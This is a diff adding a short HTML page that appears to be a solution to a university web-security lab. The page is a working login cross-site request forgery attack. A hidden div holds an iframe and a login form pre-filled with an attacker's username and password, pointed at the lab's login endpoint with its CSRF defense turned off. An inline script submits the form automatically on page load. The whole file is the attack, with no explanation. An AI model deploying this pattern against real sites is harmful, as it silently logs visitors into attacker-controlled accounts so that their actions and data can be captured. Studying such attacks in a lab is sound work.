@@ -1,0 +1,19 @@
+<html>
+    <head>
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+    </head>
+    <body>
+        <div style="display: none;">
+            <iframe name="attackSite" src=""></iframe>
+            <form action="https://project2.ecen4133.org/login?csrfdefense=0&xssdefense=4", method="post", target="attackSite", id="loginForm">
+                <input type="text", name="username" value="attacker">
+                <input type="text", name="password" value="l33th4x">
+                <button type="submit"></button>
+            </form>
+            <script>
+                document.getElementById("loginForm").submit()
+            </script>
+        </div>
+        
+    </body>
+</html>
